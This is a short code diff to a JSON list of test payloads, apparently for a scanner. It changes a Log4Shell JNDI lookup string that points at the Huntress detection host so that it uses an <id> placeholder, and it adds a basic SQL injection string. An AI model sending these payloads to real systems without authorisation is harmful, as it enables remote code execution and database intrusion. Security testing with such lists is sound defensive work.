@@ -1,3 +1,5 @@
 [
-    {"id":"log4shell","payload":"${jndi:ldap://log4shell.huntress.com:1389/e86dd104-791b-4d17-9cc3-2a63a78e6df2}"}
+    {"id":"log4shell","payload":"${jndi:ldap://log4shell.huntress.com:1389/<id>}"},
+    {"id":"mysqli-basic","payload":"' or 1=1-- -"}
 ]
+
